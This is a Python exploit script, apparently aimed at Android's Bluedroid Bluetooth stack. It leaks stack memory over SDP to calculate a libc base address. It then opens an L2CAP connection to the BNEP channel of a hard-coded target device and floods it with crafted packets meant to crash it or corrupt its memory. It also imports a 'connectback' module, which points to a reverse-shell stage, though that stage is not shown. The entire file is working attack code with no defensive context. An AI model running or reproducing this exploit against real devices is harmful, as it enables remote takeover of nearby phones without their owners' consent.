import os
import sys
import time
import struct
import select
import binascii

import bluetooth
from bluetooth import _bluetooth as bt

import bluedroid
import connectback

from pwn import log


BNEP_PSM = 15


LOCAL_BTADDR = 'd8:fc:93:6e:aa:95'
#TARGET_BTADDR = '2c:8a:72:ff:0a:67'
TARGET_BTADDR = '78:f8:82:95:6d:85'

def leak(dst):
    print ("[*] Connecting SDP...")

    result = bluedroid.my_sdp_info_leak(dst)

    i = 0
    j = 0

    print ("[*] Stack dump...")
    for x in result:
        for y in x:
            print("%d:%d: 0x%x" % (i,j,y))
            j += 1
        i += 1
        j = 0

    LIBC_OFFSET = 0x557f3
    LIBC_BASE = result[5][0] - LIBC_OFFSET
    print("[*] LIBC_BASE: 0x%0x" % LIBC_BASE)

def crash(dst):
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)

    bnep.bind( (LOCAL_BTADDR, 0) )
    bnep.connect( (dst, BNEP_PSM) )

    print("[*] BNEP Connected.")

    for i in range(20):
        bnep.send( binascii.unhexlify('8109' + '800109' * 100) )

    for i in range(1000):
        if i % 10 == 0:
            sys.stdout.write('.')
            sys.stdout.flush()
        bnep.send( binascii.unhexlify('810100') + struct.pack('<II', 0, 0xdeadbeef+i) )

    print ("")

if __name__ == '__main__':

    #bluedroid.my_sdp_info(TARGET_BTADDR)
    #bluedroid.my_evil_sdp_info_leak(TARGET_BTADDR)

    leak(TARGET_BTADDR)
    crash(TARGET_BTADDR)

    sys.exit(0)
